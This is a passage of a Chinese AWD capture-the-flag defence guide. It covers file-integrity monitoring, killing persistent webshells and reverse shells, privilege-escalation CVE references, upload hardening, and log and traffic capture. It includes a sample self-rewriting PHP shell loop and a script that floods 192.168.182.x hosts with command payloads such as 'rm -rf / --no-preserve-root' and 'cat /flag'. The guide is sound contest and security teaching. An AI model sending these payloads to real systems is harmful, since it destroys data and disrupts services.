+            <span class="n">md5obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+            <span class="n">md5obj</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+            <span class="nb">hash</span> <span class="o">=</span> <span class="n">md5obj</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+            <span class="k">return</span> <span class="nb">hash</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="sa">u</span><span class="s1">'[!] getmd5_error : '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">ORIGIN_FILE_LIST</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+            <span class="n">FILE_MD5_DICT</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">pass</span>
+
+<span class="c1"># 获取所有文件MD5</span>
+<span class="k">def</span> <span class="nf">getfilemd5dict</span><span class="p">(</span><span class="n">filelist</span> <span class="o">=</span> <span class="p">[]):</span>
+    <span class="n">filemd5dict</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="k">for</span> <span class="n">ori_file</span> <span class="ow">in</span> <span class="n">filelist</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">Special_path_str</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ori_file</span><span class="p">:</span>
+            <span class="n">md5</span> <span class="o">=</span> <span class="n">calcMD5</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">ori_file</span><span class="p">))</span>
+            <span class="k">if</span> <span class="n">md5</span><span class="p">:</span>
+                <span class="n">filemd5dict</span><span class="p">[</span><span class="n">ori_file</span><span class="p">]</span> <span class="o">=</span> <span class="n">md5</span>
+    <span class="k">return</span> <span class="n">filemd5dict</span>
+
+<span class="c1"># 备份所有文件</span>
+<span class="k">def</span> <span class="nf">backup_file</span><span class="p">(</span><span class="n">filelist</span><span class="o">=</span><span class="p">[]):</span>
+    <span class="c1"># if len(os.listdir(Special_path['bak'])) == 0:</span>
+    <span class="k">for</span> <span class="n">filepath</span> <span class="ow">in</span> <span class="n">filelist</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">Special_path_str</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">filepath</span><span class="p">:</span>
+            <span class="n">shutil</span><span class="o">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">Special_path</span><span class="p">[</span><span class="s1">'bak'</span><span class="p">])</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="k">print</span> <span class="sa">u</span><span class="s1">'---------start------------'</span>
+    <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">Special_path</span><span class="p">:</span>
+        <span class="n">mkdir_p</span><span class="p">(</span><span class="n">Special_path</span><span class="p">[</span><span class="n">value</span><span class="p">])</span>
+    <span class="c1"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span>
+    <span class="n">ORIGIN_FILE_LIST</span> <span class="o">=</span> <span class="n">getfilelist</span><span class="p">(</span><span class="n">CWD</span><span class="p">)</span>
+    <span class="n">FILE_MD5_DICT</span> <span class="o">=</span> <span class="n">getfilemd5dict</span><span class="p">(</span><span class="n">ORIGIN_FILE_LIST</span><span class="p">)</span>
+    <span class="n">backup_file</span><span class="p">(</span><span class="n">ORIGIN_FILE_LIST</span><span class="p">)</span> <span class="c1"># TODO 备份文件可能会产生重名BUG</span>
+    <span class="k">print</span> <span class="sa">u</span><span class="s1">'[*] pre work end!'</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">file_list</span> <span class="o">=</span> <span class="n">getfilelist</span><span class="p">(</span><span class="n">CWD</span><span class="p">)</span>
+        <span class="c1"># 移除新上传文件</span>
+        <span class="n">diff_file_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">file_list</span><span class="p">)</span> <span class="o">^</span> <span class="nb">set</span><span class="p">(</span><span class="n">ORIGIN_FILE_LIST</span><span class="p">))</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">diff_file_list</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="c1"># import pdb;pdb.set_trace()</span>
+            <span class="k">for</span> <span class="n">filepath</span> <span class="ow">in</span> <span class="n">diff_file_list</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="k">if</span> <span class="n">Special_string</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="sa">u</span><span class="s1">'[*] webshell find : '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+                        <span class="n">shutil</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">Special_path</span><span class="p">[</span><span class="s1">'webshell'</span><span class="p">],</span> <span class="n">ntpath</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'.txt'</span><span class="p">))</span>
+                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="sa">u</span><span class="s1">'[!] move webshell error, "</span><span class="si">%s</span><span class="s1">" maybe is webshell.'</span><span class="o">%</span><span class="n">getUnicode</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">Special_path</span><span class="p">[</span><span class="s1">'log'</span><span class="p">],</span> <span class="s1">'log.txt'</span><span class="p">),</span> <span class="s1">'a'</span><span class="p">)</span>
+                        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'newfile: '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span> <span class="o">+</span> <span class="s1">' : '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">ctime</span><span class="p">())</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+                        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="sa">u</span><span class="s1">'[-] log error : file move error: '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+
+        <span class="c1"># 防止任意文件被修改,还原被修改文件</span>
+        <span class="n">md5_dict</span> <span class="o">=</span> <span class="n">getfilemd5dict</span><span class="p">(</span><span class="n">ORIGIN_FILE_LIST</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">filekey</span> <span class="ow">in</span> <span class="n">md5_dict</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">md5_dict</span><span class="p">[</span><span class="n">filekey</span><span class="p">]</span> <span class="o">!=</span> <span class="n">FILE_MD5_DICT</span><span class="p">[</span><span class="n">filekey</span><span class="p">]:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filekey</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="k">if</span> <span class="n">Special_string</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="sa">u</span><span class="s1">'[*] file had be change : '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">filekey</span><span class="p">)</span>
+                        <span class="n">shutil</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="n">filekey</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">Special_path</span><span class="p">[</span><span class="s1">'difffile'</span><span class="p">],</span> <span class="n">ntpath</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">filekey</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'.txt'</span><span class="p">))</span>
+                        <span class="n">shutil</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">Special_path</span><span class="p">[</span><span class="s1">'bak'</span><span class="p">],</span> <span class="n">ntpath</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">filekey</span><span class="p">)),</span> <span class="n">filekey</span><span class="p">)</span>
+                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="sa">u</span><span class="s1">'[!] move webshell error, "</span><span class="si">%s</span><span class="s1">" maybe is webshell.'</span><span class="o">%</span><span class="n">getUnicode</span><span class="p">(</span><span class="n">filekey</span><span class="p">)</span>
+                    <span class="k">try</span><span class="p">:</span>
+                        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">Special_path</span><span class="p">[</span><span class="s1">'log'</span><span class="p">],</span> <span class="s1">'log.txt'</span><span class="p">),</span> <span class="s1">'a'</span><span class="p">)</span>
+                        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'diff_file: '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">filekey</span><span class="p">)</span> <span class="o">+</span> <span class="s1">' : '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">ctime</span><span class="p">())</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
+                        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="sa">u</span><span class="s1">'[-] log error : done_diff: '</span> <span class="o">+</span> <span class="n">getUnicode</span><span class="p">(</span><span class="n">filekey</span><span class="p">)</span>
+                        <span class="k">pass</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="c1"># print '[*] ' + getUnicode(time.ctime())</span>
+</pre></div>
+<p>运行</p>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">jiankong</span><span class="o">.</span><span class="n">py</span>  <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span>
+</pre></div>
+<h2 id="toc-17">alias起别名</h2>
+
+<pre><code>alias cat="echo nothing"</code></pre>
+<p>删除</p>
+
+<pre><code>unalias -a</code></pre>
+<p>对方执行cat /flag命令的时候回显就是错误flag</p>
+
+<pre><code>alias cat="echo `date`|md5sum|cut -d ' ' -f1||"</code></pre>
+<p>获取 flag 一般是 curl <a href="http://xxx.com/flag.txt" target="_blank">http://xxx.com/flag.txt</a></p>
+<div class="highlight"><pre><span></span><span class="nb">alias</span> <span class="nv">curl</span><span class="o">=</span><span class="s1">'echo fuckoff'</span> <span class="c1">#权限要求较低，可以在这里改成虚假的flag</span>
+<span class="c1"># 或者</span>
+chmod -x curl <span class="c1">#权限要求较高</span>
+/usr/bin curl路径
+</pre></div>
+<h2 id="toc-18">杀不死马</h2>
+<p>查看进程</p>
+<div class="highlight"><pre><span></span>root@1177499f5b23:~# ps aux <span class="p">|</span> grep www-data
+www-data  <span class="m">4819</span>  <span class="m">0</span>.0  <span class="m">0</span>.4 <span class="m">315808</span>  <span class="m">9016</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">6663</span>  <span class="m">0</span>.0  <span class="m">0</span>.6 <span class="m">316188</span> <span class="m">13460</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">6675</span>  <span class="m">0</span>.0  <span class="m">0</span>.3 <span class="m">315620</span>  <span class="m">6976</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">6690</span>  <span class="m">0</span>.0  <span class="m">0</span>.4 <span class="m">315808</span>  <span class="m">9016</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">6693</span>  <span class="m">0</span>.0  <span class="m">0</span>.4 <span class="m">315800</span>  <span class="m">9056</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">7170</span>  <span class="m">0</span>.0  <span class="m">0</span>.6 <span class="m">316312</span> <span class="m">14100</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">7239</span>  <span class="m">0</span>.0  <span class="m">0</span>.6 <span class="m">316172</span> <span class="m">14020</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">7526</span>  <span class="m">0</span>.0  <span class="m">0</span>.4 <span class="m">315620</span>  <span class="m">8364</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data  <span class="m">8380</span>  <span class="m">0</span>.0  <span class="m">0</span>.6 <span class="m">316188</span> <span class="m">12612</span> ?        S    Dec16   <span class="m">0</span>:00 apache2 -D FOREGROUND
+www-data <span class="m">22554</span>  <span class="m">0</span>.0  <span class="m">0</span>.3 <span class="m">315564</span>  <span class="m">7416</span> ?        S    <span class="m">03</span>:10   <span class="m">0</span>:00 apache2 -D FOREGROUND
+root     <span class="m">25353</span>  <span class="m">0</span>.0  <span class="m">0</span>.0   <span class="m">8868</span>  <span class="m">1544</span> pts/1    S+   <span class="m">05</span>:25   <span class="m">0</span>:00 grep --color<span class="o">=</span>auto www-data
+</pre></div>
+<p>(1)杀进程</p>
+<div class="highlight"><pre><span></span><span class="nb">kill</span> -9 对应的进程号
+</pre></div>
+<p>执行命令</p>
+<div class="highlight"><pre><span></span><span class="x">ps aux | grep www-data | awk '{print $2}' | xargs kill -9</span>
+<span class="x">ps aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9</span>
+</pre></div>
+<p>原理</p>
+<div class="highlight"><pre><span></span>ps aux
+列出进程信息
+
+grep www-data
+在进程信息中找到需要杀死的进程
+
+grep -v grep
+在进程信息中剔除带grep的信息
+
+awk ‘<span class="o">{</span>print <span class="nv">$2</span><span class="o">}</span>’
+提取字符串行内容的第2个字段，也就是当前示例的进程号
+
+xargs <span class="nb">kill</span> -9
+将进程号作为参数传递给kill -9这个命令
+</pre></div>
+<p>然后删除不死马文件</p>
+<p>(2)重启php等web服务，不推荐使用</p>
+<div class="highlight"><pre><span></span>service php-fpm restart
+</pre></div>
+<p>(3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$pid</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span>  <span class="c1">#不死马进程</span>
+    <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s1">'demo.php'</span><span class="p">);</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="s1">'kill -9 $pid'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="cp">&lt;?php</span>
+    <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+    <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nb">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="nv">$file</span> <span class="o">=</span> <span class="s1">'.3.php'</span><span class="p">;</span>
+    <span class="nv">$code</span> <span class="o">=</span> <span class="s1">'hi springbird !'</span><span class="p">;</span>
+    <span class="c1">//pass=pass</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$code</span><span class="p">);</span>
+        <span class="nb">system</span><span class="p">(</span><span class="s1">'touch -m -d "2018-12-01 09:10:12" .3.php'</span><span class="p">);</span>
+    <span class="c1">//    usleep(5000);</span>
+          <span class="nb">usleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>(4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php<br>
+循环创建</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+<span class="nv">dire</span><span class="o">=</span><span class="s2">"/var/www/html/.base.php/"</span>
+<span class="nv">file</span><span class="o">=</span><span class="s2">"/var/www/html/.base.php"</span>
+rm -rf <span class="nv">$file</span>
+mkdir <span class="nv">$dire</span>
+./xx.sh
+</pre></div>
+<h2 id="toc-19">清除反弹shell</h2>
+<p>查看进程</p>
+<div class="highlight"><pre><span></span>ps -ef / px -aux
+</pre></div>
+<p>出现www-data权限的/bin/sh一般为nc</p>
+<p>然后杀进程</p>
+<div class="highlight"><pre><span></span><span class="nb">kill</span> <span class="sb">`</span>ps -aux <span class="p">|</span> grep www-data <span class="p">|</span> grep apache2 <span class="p">|</span> awk <span class="s1">'{print $2}'</span><span class="sb">`</span>
+</pre></div>
+<h2 id="toc-20">提权</h2>
+<p>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。</p>
+<p>关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p>
+<p>影响范围比较大的漏洞，可以用来提权：</p>
+<div class="highlight"><pre><span></span>CVE-2017-6074 <span class="o">(</span>DCCP双重释放漏洞 &gt; <span class="m">2</span>.6.18 <span class="o">)</span> ：
+DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务<span class="o">(</span>系统崩溃<span class="o">)</span>或者提升权限，获得系统的管理访问权限
+
+CVE-2016-5195<span class="o">(</span>脏牛，kernel <span class="m">2</span>.6.22 &lt; <span class="m">3</span>.9 <span class="o">(</span>x86/x64<span class="o">))</span> ：
+低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 <span class="m">0</span> 即可提升为root权限
+
+CVE-2016-8655<span class="o">(</span>Ubuntu <span class="m">12</span>.04、14.04，Debian <span class="m">7</span>、8<span class="o">)</span> ：
+条件竞争漏洞，可以让低权限的进程获得内核代码执行权限
+POC：https://www.seebug.org/vuldb/ssvid-92567
+
+CVE-2017-1000367<span class="o">(</span>sudo本地提权漏洞 <span class="o">)</span> ：L
+inux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。
+
+CVE-2016-1247<span class="o">(</span>Nginx权限提升漏洞<span class="o">)</span> ：
+Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。
+POC：https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+</pre></div>
+<h2 id="toc-21">漏洞修复</h2>
+<p>基本原则</p>
+<ul>
+<li>能修复的尽量修复；</li>
+<li>不能修复的先注释源码，不影响页面显示再删除；</li>
+<li>站点和对应的功能尽可能不宕机；</li>
+</ul>
+<p>技巧</p>
+<ul>
+<li>设置 waf，如 load_file；</li>
+<li>对于一些成型的 CMS，找到相应版本号后，对其 diff；</li>
+<li>修改弱口令用户；</li>
+<li>对于觉得危险函数的地方直接使用die()；</li>
+</ul>
+<p>比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行</p>
+<div class="highlight"><pre><span></span>&lt;Directory <span class="s2">"/var/www/html/upload"</span>&gt;
+Options -ExecCGI -Indexes
+AllowOverride None
+RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
+RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
+php_flag engine off
+&lt;FilesMatch <span class="s2">".+\.ph(p[3457]?|t|tml)</span>$<span class="s2">"</span>&gt;
+deny from all
+&lt;/FilesMatch&gt;
+&lt;/Directory&gt;
+</pre></div>
+<p>一些修复技巧参考：<a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/" target="_blank">https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/</a></p>
+<h2 id="toc-22">日志分析</h2>
+<p>命令行动态查看日志</p>
+<div class="highlight"><pre><span></span>tailf /var/log/apache2/access.log
+</pre></div>
+<p>还可以使用工具进行日志分析：<a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank">LogForensics 腾讯实验室 /web日志取证分析工具</a></p>
+<p>日志的存放地址</p>
+<div class="highlight"><pre><span></span>/var/log/apache2/
+/usr/local/apache2/logs
+/usr/nginx/logs/
+</pre></div>
+<p>为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。</p>
+<div class="highlight"><pre><span></span>import requests
+import <span class="nb">time</span>
+
+def scan_attack<span class="o">()</span>:
+    <span class="nv">file</span><span class="o">={</span><span class="s1">'shell.php'</span>,<span class="s1">'admin.php'</span>,<span class="s1">'web.php'</span>,<span class="s1">'login.php'</span>,<span class="s1">'1.php'</span>,<span class="s1">'index.php'</span><span class="o">}</span>
+    <span class="nv">payload</span><span class="o">={</span><span class="s1">'cat /flag'</span>,<span class="s1">'ls -al'</span>,<span class="s1">'rm -f'</span>,<span class="s1">'echo 1'</span>,<span class="s1">'echo 1 /proc/sys/net/ipv4/ip_forward'</span>,<span class="s1">'rm -rf / --no-preserve-root'</span><span class="o">}</span>
+    <span class="k">while</span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:
+        <span class="k">for</span> i in range<span class="o">(</span><span class="m">1</span>, <span class="m">50</span><span class="o">)</span>:
+            <span class="k">for</span> ii in file:
+                <span class="nv">url</span><span class="o">=</span><span class="s1">'http://192.168.182.'</span>+ str<span class="o">(</span>i<span class="o">)</span>+<span class="s1">'/'</span>+ii
+                print<span class="o">(</span>url<span class="o">)</span>
+                <span class="k">for</span> iii in payload:
+                    <span class="nv">data</span><span class="o">={</span>
+                        <span class="s1">'payload'</span>:iii
+                    <span class="o">}</span>
+                    try:
+                        requests.post<span class="o">(</span>url,data<span class="o">=</span>data<span class="o">)</span>
+                        print<span class="o">(</span><span class="s2">"正在搅屎:"</span>+str<span class="o">(</span>i<span class="o">)</span>+<span class="s1">'|'</span>+ii+<span class="s1">'|'</span>+iii<span class="o">)</span>
+                        time.sleep<span class="o">(</span><span class="m">0</span>.1<span class="o">)</span>
+                    except Exception as e:
+                        time.sleep<span class="o">(</span><span class="m">0</span>.1<span class="o">)</span>
+                        pass
+
+
+<span class="k">if</span> <span class="nv">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span>:
+    scan_attack<span class="o">()</span>
+</pre></div>
+<h2 id="toc-23">流量分析</h2>
+<p>在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到</p>
+<div class="highlight"><pre><span></span>sudo tcpdump -s <span class="m">0</span> -w flow.pcap port <span class="m">80</span>
+<span class="c1"># 然后使用 scp 写个脚本实时将流量包拷贝到本地</span>
+
+
+tcpdump tcp -i eth1 -t -s <span class="m">0</span> -c <span class="m">100</span> and dst port ! <span class="m">22</span> and src net <span class="m">192</span>.168.1.0/24 -w ./target.cap
+命令拆解分析：
+<span class="m">1</span>、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型
+<span class="m">2</span>、-i eth1 : 只抓经过接口eth1的包
+<span class="m">3</span>、-t : 不显示时间戳
+<span class="m">4</span>、-s <span class="m">0</span> : 抓取数据包时默认抓取长度为68字节。加上-S <span class="m">0</span> 后可以抓到完整的数据包
+<span class="m">5</span>、-c <span class="m">100</span> : 只抓取100个数据包
+<span class="m">6</span>、dst port ! <span class="m">22</span> : 不抓取目标端口是22的数据包
+<span class="m">7</span>、src net <span class="m">192</span>.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24
+<span class="m">8</span>、-w ./target.cap : 保存成cap文件，方便用wireshark分析
+</pre></div>
+<p>PHP版流量监控</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+  <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'Asia/Shanghai'</span><span class="p">);</span>
+
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">];</span> <span class="c1">//记录访问者的ip</span>
+
+<span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">];</span> <span class="c1">//访问者要访问的文件名</span>
+
+<span class="nv">$parameter</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"QUERY_STRING"</span><span class="p">];</span> <span class="c1">//访问者要请求的参数</span>
+
+<span class="nv">$time</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">,</span><span class="nb">time</span><span class="p">());</span> <span class="c1">//访问时间</span>
+
+<span class="nv">$logadd</span> <span class="o">=</span> <span class="s1">'来访时间：'</span><span class="o">.</span><span class="nv">$time</span><span class="o">.</span><span class="s1">'--&gt;'</span><span class="o">.</span><span class="s1">'访问链接：'</span><span class="o">.</span><span class="s1">'http://'</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s1">'?'</span><span class="o">.</span><span class="nv">$parameter</span><span class="o">.</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="c1">// log记录</span>
+
+<span class="nv">$fh</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"log.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fh</span><span class="p">,</span> <span class="nv">$logadd</span><span class="p">);</span>
+
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>一个针对php的web流量抓取、分析的应用：<a href="https://github.com/wupco" target="_blank">wupco</a>/<a href="https://github.com/wupco/weblogger" target="_blank">weblogger</a><br>
+使用方法</p>
+<div class="highlight"><pre><span></span><span class="nb">cd</span> /var/www/html/ <span class="o">(</span>or other web dir<span class="o">)</span>
+
+   git clone https://github.com/wupco/weblogger.git
+
+   chmod -R <span class="m">777</span> weblogger/
+
+   open http://xxxxx/weblogger/install.php in Web browser
+
+   install it
+</pre></div>
+<p><a href="https://github.com/seadog007/pcap-search" target="_blank"></a></p>
+<h2 id="toc-24"> </h2>
+<h2 id="toc-25">WAF</h2>
+<p>waf的作用：<br>
+1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找     不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。<br>
+2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了）</p>
